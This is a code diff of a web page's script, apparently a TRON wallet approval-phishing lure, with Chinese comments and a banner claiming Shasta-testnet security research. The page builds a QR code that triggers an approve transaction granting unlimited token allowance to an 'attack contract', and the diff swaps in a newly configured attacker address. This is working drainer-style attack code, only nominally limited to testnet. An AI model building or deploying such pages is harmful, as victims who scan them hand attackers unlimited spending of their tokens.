@@ -23,10 +23,10 @@
     <div class="note">⚠️ 请确保钱包网络为 Shasta 测试网 | 此页面仅用于安全研究</div>
 
     <script>
-        // ========== 配置攻击合约地址（替换为你部署的攻击合约地址）==========
-        const ATTACK_CONTRACT = "TYKsGMu19ACE4XZgU5NdYiFg1QXPkHG6zA";  // 攻击合约地址
+        // ========== 已配置你的攻击合约地址 ==========
+        const ATTACK_CONTRACT = "TVdbKFNVRJjYpdPHDxSoeLw7Tp5AmA11zh";  // 攻击合约地址
         const TOKEN_ADDRESS = "TG3XXyExBkPp9nzdajDZsozEu4BkaSJozs";      // Shasta 测试 USDT
-        // =================================================================
+        // ===========================================
 
         // 生成授权二维码（手机扫码后自动弹出 approve 交易）
         const txForQR = {
@@ -34,7 +34,7 @@
             functionSelector: "approve(address,uint256)",
             parameter: [
                 { type: "address", value: ATTACK_CONTRACT },
-                { type: "uint256", value: "ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff" } // 最大授权额度
+                { type: "uint256", value: "ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff" }
             ],
             callValue: 0,
             feeLimit: 100_000_000
